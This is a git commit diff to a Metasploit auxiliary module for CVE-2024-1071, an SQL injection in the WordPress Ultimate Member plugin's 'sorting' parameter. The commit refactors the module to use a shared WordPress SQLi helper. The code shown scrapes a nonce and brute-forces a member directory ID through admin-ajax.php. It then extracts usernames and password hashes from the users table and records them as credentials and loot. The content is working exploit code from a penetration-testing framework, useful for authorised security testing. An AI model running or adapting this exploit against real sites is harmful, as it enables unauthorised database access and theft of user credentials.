244a23d84ca73fa8be9be2bfea16c5c9b7626513
Chocapikk <balgogan@protonmail.com>
2024-09-25 01:55:17 +0200

    Use Msf::Exploit::Remote::HTTP::Wordpress::SQLi

--- modules/auxiliary/scanner/http/wp_ultimate_member_sorting_sqli.rb
+++ modules/auxiliary/scanner/http/wp_ultimate_member_sorting_sqli.rb
@@ -4,9 +4,9 @@
 ##
 
 class MetasploitModule < Msf::Auxiliary
-  include Msf::Exploit::SQLi
   include Msf::Auxiliary::Scanner
   include Msf::Exploit::Remote::HTTP::Wordpress
+  include Msf::Exploit::Remote::HTTP::Wordpress::SQLi
 
   def initialize(info = {})
     super(
@@ -49,6 +49,56 @@ class MetasploitModule < Msf::Auxiliary
     ]
   end
 
+  def get_nonce
+    print_status('Getting nonce...')
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'register')
+    })
+    fail_with(Failure::Unreachable, 'Connection failed') unless res
+
+    nonce = res.body.scan(/"nonce":"([^"]+)"/).flatten.first
+    if nonce
+      print_good("Nonce retrieved: #{nonce}")
+    else
+      fail_with(Failure::UnexpectedReply, 'Failed to retrieve nonce')
+    end
+
+    nonce
+  end
+
+  def get_directory_id(nonce)
+    min_range = datastore['DIR_ID_MIN']
+    max_range = datastore['DIR_ID_MAX']
+    print_status("Searching for valid directory id between #{min_range} and #{max_range}...")
+
+    (min_range..max_range).each do |num|
+      id = Rex::Text.md5(num.to_s)[10..14]
+      res = send_request_cgi({
+        'method' => 'POST',
+        'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
+        'vars_post' => {
+          'action' => 'um_get_members',
+          'nonce' => nonce,
+          'directory_id' => id
+        }
+      })
+
+      next unless res
+
+      json_body = res.get_json_document
+
+      if json_body && json_body['success'] == true
+        print_good("Valid directory ID found: #{id} (tested with #{num})")
+        return id
+      else
+        next
+      end
+    end
+
+    fail_with(Failure::NotFound, "Could not find a valid directory id within the range #{min_range} to #{max_range}")
+  end
+
   def run_host(ip)
     print_status("Performing SQL injection for CVE-2024-1071 via the 'sorting' parameter...")
 
@@ -73,98 +123,21 @@ class MetasploitModule < Msf::Auxiliary
         fail_with(Failure::Unreachable, 'Connection failed') unless res
       end
 
-      fail_with(Failure::NotVulnerable, 'Target is not vulnerable or delay is too short.') unless @sqli.test_vulnerable
+      wordpress_sqli_initialize(@sqli)
 
-      columns = ['user_login', 'user_pass']
-      data = @sqli.dump_table_fields('wp_users', columns, '', datastore['COUNT'])
-
-      table = Rex::Text::Table.new(
-        'Header' => 'wp_users',
-        'Indent' => 4,
-        'Columns' => columns
-      )
-
-      loot_data = ''
-
-      data.each do |user|
-        table << user
-        loot_data << "Username: #{user[0]}, Password Hash: #{user[1]}\n"
-
-        create_credential({
-          workspace_id: myworkspace_id,
-          origin_type: :service,
-          module_fullname: fullname,
-          username: user[0],
-          private_type: :nonreplayable_hash,
-          jtr_format: Metasploit::Framework::Hashes.identify_hash(user[1]),
-          private_data: user[1],
-          service_name: 'WordPress',
-          address: ip,
-          port: datastore['RPORT'],
-          protocol: 'tcp',
-          status: Metasploit::Model::Login::Status::UNTRIED
-        })
+      unless @sqli.test_vulnerable
+        fail_with(Failure::NotVulnerable, 'Target is not vulnerable or delay is too short.')
       end
 
-      print_good('Dumped user data:')
-      print_line(table.to_s)
+      table_prefix = wordpress_sqli_identify_table_prefix
+      unless table_prefix
+        fail_with(Failure::NotFound, 'Failed to identify the WordPress table prefix.')
+      end
 
-      loot_path = store_loot(
-        'wordpress.users',
-        'text/plain',
-        ip,
-        loot_data,
-        'wp_users.txt',
-        'WordPress Usernames and Password Hashes'
-      )
+      wordpress_sqli_get_users_credentials(table_prefix, ip, datastore['COUNT'])
 
-      print_good("Loot saved to: #{loot_path}")
     else
       fail_with(Failure::NotFound, 'Failed to retrieve nonce or directory_id')
     end
-  end
-
-  def get_nonce
-    print_status('Getting nonce...')
-    res = send_request_cgi({
-      'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, 'register')
-    })
-    fail_with(Failure::Unreachable, 'Connection failed') unless res
-
-    nonce = res.body.scan(/"nonce":"([^"]+)"/).flatten.first
-    nonce ? print_good("Nonce retrieved: #{nonce}") : fail_with(Failure::UnexpectedReply, 'Failed to retrieve nonce')
-
-    nonce
-  end
-
-  def get_directory_id(nonce)
-    min_range = datastore['DIR_ID_MIN']
-    max_range = datastore['DIR_ID_MAX']
-    print_status("Searching for valid directory id between #{min_range} and #{max_range}...")
-
-    (min_range..max_range).each do |num|
-      id = Rex::Text.md5(num.to_s)[10..14]
-      res = send_request_cgi({
-        'method' => 'POST',
-        'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
-        'vars_post' => {
-          'action' => 'um_get_members',
-          'nonce' => nonce,
-          'directory_id' => id
-        }
-      })
-
-      json_body = res.get_json_document
-
-      if json_body && json_body['success'] == true
-        (print_good("Valid directory ID found: #{id} (tested with #{num})")
-         return id)
-      else
-        next
-      end
-    end
-
-    fail_with(Failure::NotFound, "Could not find a valid directory id within the range #{min_range} to #{max_range}")
   end
 end
